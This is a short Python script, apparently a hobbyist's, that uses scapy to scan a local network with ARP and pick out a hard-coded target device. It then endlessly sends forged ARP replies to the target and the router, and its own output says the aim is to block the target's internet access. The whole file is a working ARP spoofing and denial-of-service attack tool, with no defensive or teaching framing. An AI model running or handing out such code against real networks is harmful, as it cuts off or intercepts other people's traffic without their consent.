import scapy
from scapy.all import ARP, Ether, srp,send
import time






def get_taget_info():
    """
    gets all ip and macs in network and puts them in an array of dictionerys
    """


    arr= []
    subnet = "10.0.0.0/24"  # Change this if your router uses a different range
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet)
    ans, _ = srp(packet, timeout=2, verbose=0)

    devices = []  # list to hold discovered devices

    for sent, received in ans:
        device = {"ip": received.psrc, "mac": received.hwsrc}
        devices.append(device)
    return devices


arr = get_taget_info()

my_ip = "10.0.0.13"
gateway_ip = "10.0.0.138"
gateawy_mac= "00:b8:c2:4e:8d:0a"
target_ip=""
target_mac=""

#print("Discovered devices:")
#for d in arr:
    #print(f"IP: {d['ip']} - MAC: {d['mac']}")

for item in arr:
        if item["ip"] == "10.0.0.8":
             
            print(item["ip"])
            print(item["mac"])
            target_ip = (item["ip"])
            target_mac = (item["mac"])


def spoof_target():
    global target_ip
    global target_mac
    global gateway_ip
    """
    Send ARP reply to target, telling it that we (attacker) are the gateway
    """
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    send(packet, verbose=0)


def spoof_router():
    global target_ip
    global target_mac
    global gateway_ip
    global gateawy_mac
    """
    Spoof the router telling it that our IP (my_ip) is at a fake MAC address
    (For example, a non-existing MAC, to break communication)
    """
    fake_mac = "00:00:00:00:00:00"  # MAC מזויף שאף אחד לא משתמש בו
    packet = ARP(op=2, pdst=gateway_ip, hwdst=gateawy_mac, psrc=target_ip)
    send(packet, verbose=0)

print(f"[+] Spoofing {target_ip} to block its internet... (Press CTRL+C to stop)")
try:
    while True:
        spoof_target()
        spoof_router()
except KeyboardInterrupt:
    print("\n[!] Stopped ARP spoofing")   
#for item in arr:
 #   if item["ip"] != my_ip and item["ip"] != gateway_ip and "c0:a5:e8" in item["mac"]:
  #      targe_ip = item["ip"]
   #     target_mac = item["mac"]


#print(targe_ip)
#print(target_mac)



